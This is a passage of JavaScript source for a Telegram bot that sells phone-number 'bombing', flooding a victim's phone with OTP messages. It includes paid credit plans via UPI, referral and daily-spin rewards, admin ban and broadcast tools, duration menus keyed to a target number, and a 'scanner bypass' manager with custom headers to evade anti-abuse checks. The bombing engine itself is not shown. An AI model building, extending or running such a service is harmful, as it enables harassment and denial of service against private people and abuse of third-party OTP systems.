    const colors = ['🟢','🔵','🟡','🔴','🟣','🟠','🟤','⚫','⚪','🟢'];
    const color = colors[day % colors.length];
    return {
        reply_markup: {
            keyboard: [
                [`${color} START BOMB`, '🔴 STOP BOMB'],
                ['💰 MY CREDITS', '🎁 DAILY SPIN'],
                ['🎟️ REDEEM CODE', '👑 ADMIN PANEL'],
                ['📊 MY STATS', '❓ HELP'],
                ['💳 BUY CREDITS', '🔗 REFERRAL'],
                ['⚙️ SETTINGS']
            ],
            resize_keyboard: true
        }
    };
}

function adminKeyboard() {
    return {
        reply_markup: {
            keyboard: [
                ['📊 STATS', '👥 USERS LIST'],
                ['🎟️ GEN CODE', '🚫 BAN USER'],
                ['✅ UNBAN USER', '💰 ADD CREDITS'],
                ['➕ ADD PROTECTED', '➖ REMOVE PROTECTED'],
                ['📋 PROTECTED LIST', '📢 BROADCAST'],
                ['📋 ALL USERS', '🔄 UNLIMITED PLAN'],
                ['📺 CHANNEL MANAGER', '🛡️ SCANNER MANAGER'],
                ['📸 SET QR CODE', '💳 PAYMENT APPROVAL'],
                ['🔙 BACK']
            ],
            resize_keyboard: true
        }
    };
}

// ============================================================
// ===== CHANNEL BUTTONS =====
// ============================================================

async function getChannelButtons() {
    const channels = await db.getChannels();
    const buttons = channels.map(ch => {
        return [{ text: `✅ ${ch}`, url: `https://t.me/${ch.replace('@', '')}` }];
    });
    buttons.push([{ text: '🟢 I have joined all channels', callback_data: 'verify_join' }]);
    return { inline_keyboard: buttons };
}

// ============================================================
// ===== PAYMENT SYSTEM =====
// ============================================================

const PAYMENT_PLANS = {
    '10': { credits: 10, price: 20, label: '10 Credits – ₹20' },
    '25': { credits: 25, price: 40, label: '25 Credits – ₹40' },
    '50': { credits: 50, price: 70, label: '50 Credits – ₹70' },
    '100': { credits: 100, price: 120, label: '100 Credits – ₹120' },
    'unlimited': { credits: 0, price: 150, label: '⭐ 1 Day Unlimited – ₹150' }
};

async function handleBuyCredits(chatId, planKey) {
    const plan = PAYMENT_PLANS[planKey];
    if (!plan) return bot.sendMessage(chatId, '❌ Invalid plan!');

    if (!qrCodeSet) {
        return bot.sendMessage(chatId, '❌ Payment QR code not configured yet. Please contact admin.');
    }

    const caption = `💳 **${plan.label}**\n\n` +
        `📌 **Instructions:**\n` +
        `1️⃣ Scan the QR code below\n` +
        `2️⃣ Pay ₹${plan.price} via UPI\n` +
        `3️⃣ Take a screenshot of payment\n` +
        `4️⃣ Send screenshot here\n\n` +
        `📸 **After payment, send screenshot!**`;

    try {
        await bot.sendPhoto(chatId, qrCodePath, { 
            caption: caption,
            parse_mode: 'Markdown'
        });

        const payId = Math.random().toString(36).substring(2, 10);
        pendingPayments.set(chatId, { ...plan, payId, status: 'pending', timestamp: Date.now() });
        userStates.set(chatId, { state: 'payment_screenshot', plan: planKey, payId });
        
    } catch (error) {
        bot.sendMessage(chatId, `❌ Failed to send QR code. Please try again.`);
    }
}

async function handlePaymentScreenshot(chatId, msg) {
    const state = userStates.get(chatId);
    if (!state || state.state !== 'payment_screenshot') return;

    if (!msg.photo) {
        return bot.sendMessage(chatId, '📸 Please send a **screenshot** of your payment.');
    }

    const planKey = state.plan;
    const plan = PAYMENT_PLANS[planKey];
    const payId = state.payId;

    const photo = msg.photo[msg.photo.length - 1];
    const file = await bot.getFile(photo.file_id);
    const url = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;

    pendingScreenshots.set(payId, {
        userId: chatId,
        username: msg.from.username || 'No username',
        first_name: msg.from.first_name || 'No name',
        plan: planKey,
        credits: plan.credits,
        price: plan.price,
        photoUrl: url,
        fileId: photo.file_id,
        timestamp: Date.now(),
        status: 'pending'
    });

    const adminMsg = `📸 **New Payment Screenshot!**\n\n` +
        `👤 User: ${msg.from.first_name} (@${msg.from.username || 'No username'})\n` +
        `🆔 User ID: \`${chatId}\`\n` +
        `💳 Plan: ${plan.label}\n` +
        `💰 Amount: ₹${plan.price}\n` +
        `🆔 Pay ID: \`${payId}\`\n\n` +
        `Approve or Reject:`;

    const approvalKeyboard = {
        inline_keyboard: [
            [
                { text: '✅ Approve', callback_data: `approve_pay_${payId}` },
                { text: '❌ Reject', callback_data: `reject_pay_${payId}` }
            ]
        ]
    };

    for (const adminId of ADMIN_IDS) {
        try {
            await bot.sendPhoto(adminId, photo.file_id, {
                caption: adminMsg,
                parse_mode: 'Markdown',
                reply_markup: approvalKeyboard
            });
        } catch (e) {
            console.error(`Failed to send to admin ${adminId}:`, e.message);
        }
    }

    await bot.sendMessage(chatId, 
        `✅ **Payment screenshot received!**\n\n` +
        `⏳ Waiting for admin approval...\n` +
        `📱 Plan: ${plan.label}\n` +
        `💳 Amount: ₹${plan.price}\n\n` +
        `You will receive credits once approved.`
    );

    userStates.delete(chatId);
}

// ============================================================
// ===== QR CODE SET HANDLER (FIXED) =====
// ============================================================

async function handleSetQRCode(chatId, msg) {
    if (!ADMIN_IDS.includes(Number(chatId))) {
        return bot.sendMessage(chatId, '❌ Admin only!');
    }

    // Check if photo is sent
    if (!msg.photo) {
        return bot.sendMessage(chatId, '📸 **Please send a photo to set as QR code.**\n\nSend any image that will be shown to users when they buy credits.', { parse_mode: 'Markdown' });
    }

    try {
        const photo = msg.photo[msg.photo.length - 1];
        const file = await bot.getFile(photo.file_id);
        const url = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
        
        // Download and save QR code
        const response = await axios({ url, responseType: 'stream' });
        const writer = fs.createWriteStream(qrCodePath);
        response.data.pipe(writer);
        
        writer.on('finish', () => {
            qrCodeSet = true;
            bot.sendMessage(chatId, '✅ **QR Code saved successfully!**\n\nUsers will now see this QR code when buying credits.', { parse_mode: 'Markdown' });
        });
        
        writer.on('error', (err) => {
            bot.sendMessage(chatId, `❌ Failed to save QR code: ${err.message}`);
        });
        
        // Clear state
        userStates.delete(chatId);
        
    } catch (error) {
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
}

// ============================================================
// ===== BROADCAST SYSTEM (FIXED - ALL MEDIA TYPES) =====
// ============================================================

async function handleBroadcast(chatId, msg) {
    try {
        // Get all users
        const users = await db.User.find().select('_id');
        const totalUsers = users.length;
        
        if (totalUsers === 0) {
            return bot.sendMessage(chatId, '❌ No users found in database!');
        }
        
        // Show processing message
        const processingMsg = await bot.sendMessage(
            chatId,
            `📢 **Broadcasting to ${totalUsers} users...**\n\n⏳ Please wait...`,
            { parse_mode: 'Markdown' }
        );
        
        // ===== DETECT MESSAGE TYPE =====
        let messageType = 'text';
        let mediaId = null;
        let caption = msg.caption || '';
        
        // Check ALL media types
        if (msg.photo) {
            messageType = 'photo';
            mediaId = msg.photo[msg.photo.length - 1].file_id;
            caption = msg.caption || '';
        } else if (msg.video) {
            messageType = 'video';
            mediaId = msg.video.file_id;
            caption = msg.caption || '';
        } else if (msg.document) {
            messageType = 'document';
            mediaId = msg.document.file_id;
            caption = msg.caption || '';
        } else if (msg.audio) {
            messageType = 'audio';
            mediaId = msg.audio.file_id;
            caption = msg.caption || '';
        } else if (msg.voice) {
            messageType = 'voice';
            mediaId = msg.voice.file_id;
            caption = msg.caption || '';
        } else if (msg.sticker) {
            messageType = 'sticker';
            mediaId = msg.sticker.file_id;
        } else if (msg.animation) {
            messageType = 'animation';
            mediaId = msg.animation.file_id;
            caption = msg.caption || '';
        } else if (msg.video_note) {
            messageType = 'video_note';
            mediaId = msg.video_note.file_id;
        } else if (msg.poll) {
            messageType = 'poll';
        } else if (msg.location) {
            messageType = 'location';
        } else if (msg.contact) {
            messageType = 'contact';
        } else if (msg.game) {
            messageType = 'game';
        } else if (msg.text) {
            messageType = 'text';
        }
        
        // ===== START BROADCAST =====
        let success = 0, fail = 0, blocked = 0;
        const startTime = Date.now();
        const BATCH_SIZE_BROADCAST = 3;
        
        // Send to each user with proper media handling
        for (let i = 0; i < users.length; i++) {
            const user = users[i];
            const targetId = user._id;
            
            try {
                // Send based on message type
                switch (messageType) {
                    case 'text':
                        await bot.sendMessage(targetId, 
                            `📢 **BROADCAST**\n\n${msg.text}`, 
                            { parse_mode: 'Markdown', disable_web_page_preview: true }
                        );
                        break;
                        
                    case 'photo':
                        await bot.sendPhoto(targetId, mediaId, { 
                            caption: caption ? `📢 **BROADCAST**\n\n${caption}` : '📢 **BROADCAST**',
                            parse_mode: 'Markdown'
                        });
                        break;
                        
                    case 'video':
                        await bot.sendVideo(targetId, mediaId, { 
                            caption: caption ? `📢 **BROADCAST**\n\n${caption}` : '📢 **BROADCAST**',
                            parse_mode: 'Markdown'
                        });
                        break;
                        
                    case 'document':
                        await bot.sendDocument(targetId, mediaId, { 
                            caption: caption ? `📢 **BROADCAST**\n\n${caption}` : '📢 **BROADCAST**',
                            parse_mode: 'Markdown'
                        });
                        break;
                        
                    case 'audio':
                        await bot.sendAudio(targetId, mediaId, { 
                            caption: caption ? `📢 **BROADCAST**\n\n${caption}` : '📢 **BROADCAST**',
                            parse_mode: 'Markdown'
                        });
                        break;
                        
                    case 'voice':
                        await bot.sendVoice(targetId, mediaId, { 
                            caption: caption ? `📢 **BROADCAST**\n\n${caption}` : '📢 **BROADCAST**',
                            parse_mode: 'Markdown'
                        });
                        break;
                        
                    case 'sticker':
                        await bot.sendSticker(targetId, mediaId);
                        break;
                        
                    case 'animation':
                        await bot.sendAnimation(targetId, mediaId, { 
                            caption: caption ? `📢 **BROADCAST**\n\n${caption}` : '📢 **BROADCAST**',
                            parse_mode: 'Markdown'
                        });
                        break;
                        
                    case 'video_note':
                        await bot.sendVideoNote(targetId, mediaId);
                        break;
                        
                    case 'poll':
                        await bot.sendPoll(
                            targetId,
                            msg.poll.question,
                            msg.poll.options.map(o => o.text),
                            { 
                                is_anonymous: msg.poll.is_anonymous,
                                type: msg.poll.type,
                                allows_multiple_answers: msg.poll.allows_multiple_answers
                            }
                        );
                        break;
                        
                    case 'location':
                        await bot.sendLocation(targetId, msg.location.latitude, msg.location.longitude);
                        break;
                        
                    case 'contact':
                        await bot.sendContact(targetId, msg.contact.phone_number, msg.contact.first_name, {
                            last_name: msg.contact.last_name || '',
                            vcard: msg.contact.vcard || ''
                        });
                        break;
                        
                    case 'game':
                        await bot.sendGame(targetId, msg.game.short_name);
                        break;
                        
                    default:
                        // Fallback: use forwardMessage for unknown types
                        await bot.forwardMessage(targetId, chatId, msg.message_id);
                }
                success++;
            } catch (error) {
                if (error.message && error.message.includes('bot was blocked')) {
                    blocked++;
                } else if (error.message && error.message.includes('chat not found')) {
                    blocked++;
                } else {
                    fail++;
                    console.error(`Failed to send to ${targetId}:`, error.message);
                }
            }
            
            // Update progress every 3 users
            if ((i + 1) % BATCH_SIZE_BROADCAST === 0 || i === users.length - 1) {
                const processed = i + 1;
                const progress = Math.round((processed / totalUsers) * 100);
                const elapsed = Math.floor((Date.now() - startTime) / 1000);
                
                try {
                    await bot.editMessageText(
                        `📢 **BROADCASTING...**\n\n` +
                        `📊 Total Users: ${totalUsers}\n` +
                        `✅ Success: ${success}\n` +
                        `❌ Failed: ${fail}\n` +
                        `🚫 Blocked: ${blocked}\n` +
                        `⏳ Progress: ${progress}%\n` +
                        `⏱️ Elapsed: ${elapsed}s\n` +
                        `📎 Type: ${messageType.toUpperCase()}`,
                        {
                            chat_id: chatId,
                            message_id: processingMsg.message_id,
                            parse_mode: 'Markdown'
                        }
                    );
                } catch (e) {
                    // Ignore edit errors
                }
            }
            
            // Small delay to avoid rate limits
            await new Promise(r => setTimeout(r, 50));
        }
        
        // ===== BROADCAST COMPLETE =====
        const totalTime = Math.floor((Date.now() - startTime) / 1000);
        const successRate = totalUsers - blocked > 0 ? Math.round((success / (totalUsers - blocked)) * 100) : 0;
        
        await bot.editMessageText(
            `✅ **BROADCAST COMPLETED!**\n\n` +
            `📊 Total Users: ${totalUsers}\n` +
            `✅ Success: ${success}\n` +
            `❌ Failed: ${fail}\n` +
            `🚫 Blocked: ${blocked}\n` +
            `📈 Success Rate: ${successRate}%\n` +
            `⏱️ Time Taken: ${totalTime}s\n` +
            `📎 Message Type: ${messageType.toUpperCase()}\n\n` +
            `🔄 Use /broadcast to send another broadcast`,
            {
                chat_id: chatId,
                message_id: processingMsg.message_id,
                parse_mode: 'Markdown'
            }
        );
        
        console.log(`📢 Broadcast completed: ${success}/${totalUsers} users, ${totalTime}s, Type: ${messageType}`);
        
    } catch (error) {
        console.error('Broadcast error:', error);
        bot.sendMessage(chatId, `❌ Broadcast failed: ${error.message}`);
    } finally {
        adminBroadcastState.delete(chatId);
    }
}

// ============================================================
// ===== COMMAND HANDLERS =====
// ============================================================

// /start
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const args = msg.text.split(' ');
    const refCode = args.length > 1 ? args[1] : null;

    if (await db.isBanned(chatId)) {
        bot.sendMessage(chatId, '🚫 You are banned!');
        return;
    }

    const user = await db.getUser(chatId);
    user.username = msg.from.username || '';
    user.first_name = msg.from.first_name || '';
    await user.save();

    if (refCode) {
        user.pending_ref_code = refCode;
        await user.save();
    }

    const joined = await db.isJoined(chatId, bot);
    if (!joined) {
        const channels = await db.getChannels();
        if (channels.length > 0) {
            const keyboard = await getChannelButtons();
            bot.sendMessage(
                chatId,
                `🚫 **Please join our channel(s) first!**\n\nRequired channels:\n${channels.join('\n')}\n\nAfter joining all channels, click the green button below.`,
                { parse_mode: 'Markdown', reply_markup: keyboard }
            );
        } else {
            await showMainMenu(chatId);
        }
        return;
    }

    await showMainMenu(chatId);
});

async function showMainMenu(chatId) {
    const user = await db.getUser(chatId);
    if (user.pending_ref_code) {
        const result = await db.processReferral(chatId, user.pending_ref_code);
        bot.sendMessage(chatId, result.success ? `🎉 ${result.msg}` : `❌ ${result.msg}`);
        user.pending_ref_code = null;
        await user.save();
    }
    const code = await db.generateReferralCode(chatId);
    const botInfo = await bot.getMe();
    const welcome = `👋 Welcome!\n\n🔗 Your Referral Code: \`${code}\`\n📤 Share: \`https://t.me/${botInfo.username}?start=${code}\`\n\nUse the buttons below!`;
    bot.sendMessage(chatId, welcome, { parse_mode: 'Markdown', ...mainKeyboard() });
}

// ============================================================
// ===== MESSAGE HANDLER =====
// ============================================================

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    
    if (await db.isBanned(chatId)) return bot.sendMessage(chatId, '🚫 You are banned!');

    const user = await db.getUser(chatId);

    // ===== SMART BROADCAST MESSAGE HANDLER =====
    if (adminBroadcastState.has(chatId) && ADMIN_IDS.includes(Number(chatId))) {
        const state = adminBroadcastState.get(chatId);
        if (state && state.active) {
            // Cancel broadcast
            if (text === '/cancel' || text === 'Cancel' || text === '❌ Cancel') {
                adminBroadcastState.delete(chatId);
                return bot.sendMessage(chatId, '❌ Broadcast cancelled.');
            }
            // Process broadcast (handles all media types)
            await handleBroadcast(chatId, msg);
            return;
        }
    }

    // ===== PAYMENT SCREENSHOT HANDLER =====
    const state = userStates.get(chatId);
    if (state && state.state === 'payment_screenshot' && msg.photo) {
        await handlePaymentScreenshot(chatId, msg);
        return;
    }

    // ===== ADMIN: SET QR CODE (FIXED) =====
    if (text === '📸 SET QR CODE') {
        if (!ADMIN_IDS.includes(Number(chatId))) {
            return bot.sendMessage(chatId, '❌ Admin only!');
        }
        bot.sendMessage(chatId, '📸 **Send QR Code Photo**\n\nSend a photo to set as payment QR code.\nThis will be shown to users when they buy credits.', { parse_mode: 'Markdown' });
        userStates.set(chatId, { state: 'set_qr' });
        return;
    }

    // ===== QR CODE SET HANDLER (FIXED - GIVES RESPONSE) =====
    if (state && state.state === 'set_qr' && msg.photo) {
        await handleSetQRCode(chatId, msg);
        return;
    }

    // ===== ADMIN: PAYMENT APPROVAL =====
    if (text === '💳 PAYMENT APPROVAL') {
        if (!ADMIN_IDS.includes(Number(chatId))) {
            return bot.sendMessage(chatId, '❌ Admin only!');
        }

        const pending = Array.from(pendingScreenshots.values()).filter(p => p.status === 'pending');
        
        if (pending.length === 0) {
            return bot.sendMessage(chatId, '📭 No pending payments.');
        }

        let msgText = `💳 **Pending Payments** (${pending.length})\n\n`;
        for (const p of pending) {
            msgText += `👤 ${p.first_name} (@${p.username})\n`;
            msgText += `💳 ${p.plan} - ₹${p.price}\n`;
            msgText += `🆔 \`${p.payId}\`\n\n`;
        }
        msgText += `Check each payment in your chats and approve/reject.`;
        bot.sendMessage(chatId, msgText, { parse_mode: 'Markdown' });
        return;
    }

    // ===== BUY CREDITS =====
    if (text === '💳 BUY CREDITS') {
        const keyboard = {
            inline_keyboard: [
                [{ text: '10 Credits – ₹20', callback_data: 'buy_10' }],
                [{ text: '25 Credits – ₹40', callback_data: 'buy_25' }],
                [{ text: '50 Credits – ₹70', callback_data: 'buy_50' }],
                [{ text: '100 Credits – ₹120', callback_data: 'buy_100' }],
                [{ text: '⭐ 1 Day Unlimited – ₹150', callback_data: 'buy_unlimited' }],
            ]
        };
        bot.sendMessage(chatId, '💳 **Choose a plan:**', { parse_mode: 'Markdown', reply_markup: keyboard });
        return;
    }

    // ===== MY CREDITS =====
    if (text === '💰 MY CREDITS') {
        const isUnlimited = user.daily_unlimited > Date.now() / 1000;
        const unlimitedText = isUnlimited ? '\n⭐ **Unlimited Plan Active!**' : '';
        bot.sendMessage(chatId, 
            `💰 **Your Credits:** \`${user.credits}\`${unlimitedText}\n⚔️ **Total Attacks:** ${user.total_attacks || 0}\n\n💡 Each minute costs 1 credit (max 10)\n⭐ 1 Day Unlimited: 100 coins`,
            { parse_mode: 'Markdown' }
        );
        return;
    }

    // ===== DAILY SPIN =====
    if (text === '🎁 DAILY SPIN') {
        const now = Date.now() / 1000;
        if (user.last_daily && user.last_daily > now - 86400) {
            const remaining = Math.ceil((user.last_daily + 86400 - now) / 60);
            return bot.sendMessage(chatId, `⏳ You already claimed today's spin! Try again in ${remaining} minutes.`);
        }
        const spins = ['🎲  ...', '⚙️  ...', '🎡  ...'];
        let spinMsg = await bot.sendMessage(chatId, '🎰  ...');
        for (const spin of spins) {
            await bot.editMessageText(spin, { chat_id: chatId, message_id: spinMsg.message_id });
            await new Promise(r => setTimeout(r, 300));
        }
        const reward = Math.floor(Math.random() * 10) + 1;
        await db.updateCredits(chatId, reward);
        user.last_daily = now;
        await user.save();
        const newBalance = (await db.getUser(chatId)).credits;
        await bot.editMessageText(`🎉 **You won ${reward} credits!**\n💰 New balance: ${newBalance}`, 
            { chat_id: chatId, message_id: spinMsg.message_id, parse_mode: 'Markdown' });
        return;
    }

    // ===== REDEEM CODE =====
    if (text === '🎟️ REDEEM CODE') {
        userStates.set(chatId, { state: 'redeem_code' });
        bot.sendMessage(chatId, '🎟️ Send the redeem code:');
        return;
    }

    // ===== REFERRAL =====
    if (text === '🔗 REFERRAL') {
        if (!await db.isJoined(chatId, bot)) {
            const channels = await db.getChannels();
            return bot.sendMessage(chatId, `🚫 Join required channels first to use referral:\n${channels.join('\n')}`);
        }
        const code = await db.generateReferralCode(chatId);
        const botInfo = await bot.getMe();
        const refData = await db.getReferralData(chatId);
        const count = refData.count || 0;
        const msgText = `🔗 **Your Referral Code**\n\n🎯 \`${code}\`\n\n📊 You have referred: ${count} users\n💰 You earned: ${count * 5} credits\n\n**How it works:**\n• Share your code with friends\n• When they join, both get 5 credits!\n• **Note:** Only 1 referral per minute (anti-spam)\n• Invite link: \`https://t.me/${botInfo.username}?start=${code}\``;
        bot.sendMessage(chatId, msgText, { parse_mode: 'Markdown' });
        return;
    }

    // ===== MY STATS =====
    if (text === '📊 MY STATS') {
        const sessions = user.bomb_sessions || [];
        const totalSessions = sessions.length;
        const totalSent = sessions.reduce((sum, s) => sum + (s.total_sent || 0), 0);
        const isUnlimited = user.daily_unlimited > Date.now() / 1000;
        bot.sendMessage(chatId, 
            `📊 **Your Stats**\n👤 ID: ${chatId}\n💰 Credits: ${user.credits}\n⚔️ Attacks: ${user.total_attacks || 0}\n📈 Sessions: ${totalSessions}\n📬 OTPs Sent: ${totalSent}\n⭐ Unlimited: ${isUnlimited ? '✅ Active' : '❌ Inactive'}`,
            { parse_mode: 'Markdown' }
        );
        return;
    }

    // ===== HELP =====
    if (text === '❓ HELP') {
        bot.sendMessage(chatId, 
            `🤖 **BOT COMMANDS & HELP**\n\n📱 **/bomb** - Start bombing (choose duration)\n⏹️ **/stop** - Stop active bombing\n💰 **/credits** - Check your credits\n🎁 **/daily** - Daily spin wheel\n🎟️ **/redeem** - Redeem code\n🔗 **/referral** - Get referral link\n💳 **/buy** - Buy credits\n⚙️ **/settings** - Modify scanner/headers\n📊 **/stats** - View your stats\n\n💡 **Bombing Costs:**\n• 1-10 minutes: 1 credit per minute\n• 11-60 minutes: 10 credits\n• ⭐ 1 Day Unlimited: 100 coins\n\n💳 **Payment:**\n• Select plan > Scan QR > Pay > Send screenshot\n• Admin will approve\n\n⭐ **Referral Bonus:** 5 credits each!`,
            { parse_mode: 'Markdown' }
        );
        return;
    }

    // ===== SETTINGS =====
    if (text === '⚙️ SETTINGS') {
        const keyboard = {
            inline_keyboard: [
                [{ text: '📋 View Settings', callback_data: 'settings_view' }],
                [{ text: '🔍 Add Scanner', callback_data: 'settings_add_scanner' }],
                [{ text: '📝 Modify Headers', callback_data: 'settings_modify_headers' }]
            ]
        };
        bot.sendMessage(chatId, '⚙️ **Settings Panel**', { parse_mode: 'Markdown', reply_markup: keyboard });
        return;
    }

    // ===== ADMIN PANEL =====
    if (text === '👑 ADMIN PANEL') {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.sendMessage(chatId, '❌ You are not an admin.');
        bot.sendMessage(chatId, '🔐 Admin Panel', adminKeyboard());
        return;
    }

    if (text === '🔙 BACK') {
        bot.sendMessage(chatId, '🔙 Back to main menu', mainKeyboard());
        return;
    }

    // ===== ADMIN COMMANDS =====
    if (ADMIN_IDS.includes(Number(chatId))) {
        // ===== STATS =====
        if (text === '📊 STATS') {
            const totalUsers = await db.User.countDocuments();
            const totalAttacks = (await db.User.aggregate([{ $group: { _id: null, total: { $sum: '$total_attacks' } } }]))[0]?.total || 0;
            const totalCredits = (await db.User.aggregate([{ $group: { _id: null, total: { $sum: '$credits' } } }]))[0]?.total || 0;
            const config = await db.getScannerConfig();
            const channels = await db.getChannels();
            bot.sendMessage(chatId, 
                `📊 **BOT STATS**\n👥 Users: ${totalUsers}\n💰 Total credits: ${totalCredits}\n⚔️ Attacks: ${totalAttacks}\n📡 APIs loaded: ${uniqueApis.length}\n📺 Channels: ${channels.length}\n🛡️ Scanners: ${config.scanners.length}`,
                { parse_mode: 'Markdown' }
            );
            return;
        }

        // ===== USERS LIST =====
        if (text === '👥 USERS LIST') {
            const users = await db.User.find().select('_id username credits total_attacks').limit(20);
            let list = '👥 Users (first 20):\n\n';
            users.forEach(u => {
                list += `🆔 ${u._id} | @${u.username || 'no_username'} | 💰${u.credits} | 💥${u.total_attacks}\n`;
            });
            bot.sendMessage(chatId, list);
            return;
        }

        // ===== GEN CODE =====
        if (text === '🎟️ GEN CODE') {
            userStates.set(chatId, { state: 'gen_code' });
            bot.sendMessage(chatId, '💰 Send amount for the redeem code (max 1000):');
            return;
        }

        // ===== BAN USER =====
        if (text === '🚫 BAN USER') {
            userStates.set(chatId, { state: 'ban_user' });
            bot.sendMessage(chatId, '🚫 Send user ID to ban:');
            return;
        }

        // ===== UNBAN USER =====
        if (text === '✅ UNBAN USER') {
            userStates.set(chatId, { state: 'unban_user' });
            bot.sendMessage(chatId, '✅ Send user ID to unban:');
            return;
        }

        // ===== ADD CREDITS =====
        if (text === '💰 ADD CREDITS') {
            userStates.set(chatId, { state: 'add_credits' });
            bot.sendMessage(chatId, '💰 Send user ID:');
            return;
        }

        // ===== ADD PROTECTED =====
        if (text === '➕ ADD PROTECTED') {
            userStates.set(chatId, { state: 'add_protected' });
            bot.sendMessage(chatId, '🛡️ Send 10-digit number to protect:');
            return;
        }

        // ===== REMOVE PROTECTED =====
        if (text === '➖ REMOVE PROTECTED') {
            userStates.set(chatId, { state: 'remove_protected' });
            bot.sendMessage(chatId, '❌ Send 10-digit number to unprotect:');
            return;
        }

        // ===== PROTECTED LIST =====
        if (text === '📋 PROTECTED LIST') {
            const list = await db.getProtected();
            bot.sendMessage(chatId, `🛡️ **Protected Numbers**\n${list.length ? list.join('\n') : 'None'}`);
            return;
        }

        // ===== BROADCAST =====
        if (text === '📢 BROADCAST') {
            const keyboard = {
                inline_keyboard: [
                    [{ text: '📤 Start Broadcast', callback_data: 'smart_broadcast_start' }],
                    [{ text: '❌ Cancel', callback_data: 'smart_broadcast_cancel' }]
                ]
            };
            bot.sendMessage(chatId, '📢 **Broadcast System**\n\nSend any message (text, photo, video, GIF, etc.) to all users.', 
                { parse_mode: 'Markdown', reply_markup: keyboard });
            return;
        }

        // ===== ALL USERS =====
        if (text === '📋 ALL USERS') {
            const users = await db.User.find().select('_id username credits');
            let page = 0;
            const perPage = 15;
            const totalPages = Math.ceil(users.length / perPage);
            const sendPage = async (pageNum) => {
                const start = pageNum * perPage;
                const end = start + perPage;
                const chunk = users.slice(start, end);
                let msg = '👥 **ALL USERS**\n\n';
                chunk.forEach(u => {
                    msg += `🆔 \`${u._id}\` | @${u.username || 'no_username'} | 💰${u.credits}\n`;
                });
                msg += `\nPage ${pageNum+1}/${totalPages}`;
                const markup = totalPages > 1 ? {
                    inline_keyboard: [
                        ...(pageNum > 0 ? [{ text: '◀️ Prev', callback_data: `allusers_${pageNum-1}` }] : []),
                        ...(pageNum < totalPages-1 ? [{ text: 'Next ▶️', callback_data: `allusers_${pageNum+1}` }] : [])
                    ]
                } : undefined;
                return bot.sendMessage(chatId, msg, { parse_mode: 'Markdown', reply_markup: markup });
            };
            await sendPage(0);
            userStates.set(chatId, { state: 'allusers', users, page: 0, perPage, totalPages });
            return;
        }

        // ===== UNLIMITED PLAN =====
        if (text === '🔄 UNLIMITED PLAN') {
            userStates.set(chatId, { state: 'unlimited_plan' });
            bot.sendMessage(chatId, '⭐ Send user ID to grant 1-day unlimited bombing plan:');
            return;
        }

        // ===== CHANNEL MANAGER =====
        if (text === '📺 CHANNEL MANAGER') {
            const keyboard = {
                inline_keyboard: [
                    [{ text: '➕ Add Channel', callback_data: 'channel_add' }],
                    [{ text: '➖ Remove Channel', callback_data: 'channel_remove' }],
                    [{ text: '📋 View Channels', callback_data: 'channel_view' }],
                    [{ text: '🔙 Back to Admin', callback_data: 'admin_back' }]
                ]
            };
            bot.sendMessage(chatId, '📺 **Channel Manager**\n\nManage required channels.', { reply_markup: keyboard });
            return;
        }

        // ===== SCANNER MANAGER =====
        if (text === '🛡️ SCANNER MANAGER') {
            const keyboard = {
                inline_keyboard: [
                    [{ text: '➕ Add Scanner', callback_data: 'scanner_add' }],
                    [{ text: '➖ Remove Scanner', callback_data: 'scanner_remove' }],
                    [{ text: '📋 View Scanners', callback_data: 'scanner_view' }],
                    [{ text: '🔄 Set Global Headers', callback_data: 'scanner_headers' }],
                    [{ text: '🔙 Back to Admin', callback_data: 'admin_back' }]
                ]
            };
            bot.sendMessage(chatId, '🛡️ **Scanner Manager**\n\nManage scanner bypass configurations.', { reply_markup: keyboard });
            return;
        }
    }

    // ===== START BOMB =====
    if (text.includes('START BOMB')) {
        if (bombingStatus.get(chatId)) {
            return bot.sendMessage(chatId, '❌ You already have an active bombing session. Use /stop first.');
        }
        if (!await db.isJoined(chatId, bot)) {
            const channels = await db.getChannels();
            return bot.sendMessage(chatId, `🚫 Join required channels first:\n${channels.join('\n')}`);
        }
        bot.sendMessage(chatId, '📱 Send the 10-digit phone number to bomb:');
        userStates.set(chatId, { state: 'enter_phone' });
        return;
    }

    // ===== STOP BOMB =====
    if (text === '🔴 STOP BOMB') {
        if (bombingStatus.get(chatId)) {
            bombingStatus.set(chatId, false);
            bot.sendMessage(chatId, '⏹️ Bombing stopped.');
        } else {
            bot.sendMessage(chatId, '❌ No active bombing.');
        }
        return;
    }

    // ===== STATE HANDLERS =====
    if (userStates.has(chatId)) {
        const state = userStates.get(chatId);
        const input = text.trim();

        // ===== REDEEM CODE =====
        if (state.state === 'redeem_code') {
            const amount = await db.getRedeemCode(input.toUpperCase());
            if (amount === null) {
                bot.sendMessage(chatId, '❌ Invalid code!');
            } else {
                await db.updateCredits(chatId, amount);
                bot.sendMessage(chatId, `✅ Redeemed ${amount} credits!`);
            }
            userStates.delete(chatId);
            return;
        }

        // ===== ENTER PHONE =====
        if (state.state === 'enter_phone') {
            const phone = input.replace(/\D/g, '');
            if (phone.length !== 10) return bot.sendMessage(chatId, '❌ Invalid number! Must be 10 digits.');
            userStates.set(chatId, { phone: phone });
            const keyboard = {
                inline_keyboard: [
                    [{ text: '🟢 1 Min (1 coin)', callback_data: 'dur_1' }, { text: '🟢 2 Min (2 coins)', callback_data: 'dur_2' }, { text: '🟢 3 Min (3 coins)', callback_data: 'dur_3' }],
                    [{ text: '🟢 5 Min (5 coins)', callback_data: 'dur_5' }, { text: '🟢 10 Min (10 coins)', callback_data: 'dur_10' }, { text: '🟢 30 Min (10 coins)', callback_data: 'dur_30' }],
                    [{ text: '🟢 60 Min (10 coins)', callback_data: 'dur_60' }, { text: '⭐ 1 Day (100 coins)', callback_data: 'dur_1440' }]
                ]
            };
            bot.sendMessage(chatId, `📱 Target: \`${phone}\`\n⏱️ **Select Bombing Duration:**`, 
                { parse_mode: 'Markdown', reply_markup: keyboard });
            return;
        }

        // ===== GEN CODE (ADMIN) =====
        if (state.state === 'gen_code') {
            const amount = parseInt(input);
            if (isNaN(amount) || amount <= 0 || amount > 1000) return bot.sendMessage(chatId, '❌ Invalid amount. Max 1000.');
            const code = 'RTF' + Math.random().toString(36).substring(2, 7).toUpperCase();
            await db.createRedeemCode(code, amount);
